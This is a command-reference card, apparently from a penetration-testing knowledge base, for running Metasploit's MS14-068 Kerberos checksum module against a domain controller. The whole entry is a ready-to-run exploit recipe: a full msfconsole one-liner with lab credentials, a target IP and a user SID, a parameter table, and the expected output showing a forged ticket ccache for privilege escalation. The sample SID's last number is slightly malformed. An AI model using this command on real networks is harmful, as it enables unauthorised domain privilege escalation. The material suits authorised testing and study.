---
type: command
executor: bash
data: >-
  msfconsole -q -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; set
  DOMAIN LABDOMAIN.LOCAL; set PASSWORD P@ssw0rd; set RHOSTS 10.10.10.10; set
  RPORT 88; set USER lambda; set USER_SID
  S-1-5-21-297520375-2634728305-5197346142-1106; set TIMEOUT 10; run"
output: null
created_at: '2023-04-06T03:56:02.622436+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - exploitation
  - kerberos
verified: true
validated: true
---

# use-metasploit-ms14-068-kerberos-checksum-module

## Command

```bash
msfconsole -q -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; set DOMAIN LABDOMAIN.LOCAL; set PASSWORD P@ssw0rd; set RHOSTS 10.10.10.10; set RPORT 88; set USER lambda; set USER_SID S-1-5-21-297520375-2634728305-5197346142-1106; set TIMEOUT 10; run"
```

## Description

This command launches Metasploit and configures the ms14_068_kerberos_checksum auxiliary module to exploit the Kerberos checksum vulnerability by sending forged requests to the KDC, generating a TGT ccache for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| DOMAIN | Target domain in uppercase (e.g., LABDOMAIN.LOCAL) | Yes |
| PASSWORD | Domain user's plaintext password | Yes |
| RHOSTS | Target DC IP or range | Yes |
| RPORT | Kerberos port (default 88) | Yes |
| USER | Domain username | Yes |
| USER_SID | Full SID of the user | Yes |
| TIMEOUT | TCP connection timeout in seconds | Yes |

## Examples

### Basic Usage

```bash
msfconsole -q -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; set RHOSTS 10.10.10.10; set USER lambda; ...; run"
```

### Advanced Usage

Adjust TIMEOUT for slow networks: `set TIMEOUT 30`

## Expected Output

```
[+] Building AS-REQ... Done!
[+] Sending AS-REQ... Done!
[+] Creating ccache file... Done!
[*] Auxiliary module progress complete
```

Indicates successful ticket generation.

## Related

- [[Related Procedure: Exploit-MS14-068-Kerberos-Checksum-Validation-for-AD-Privilege-Escalation]]
- [[tools/Metasploit]]
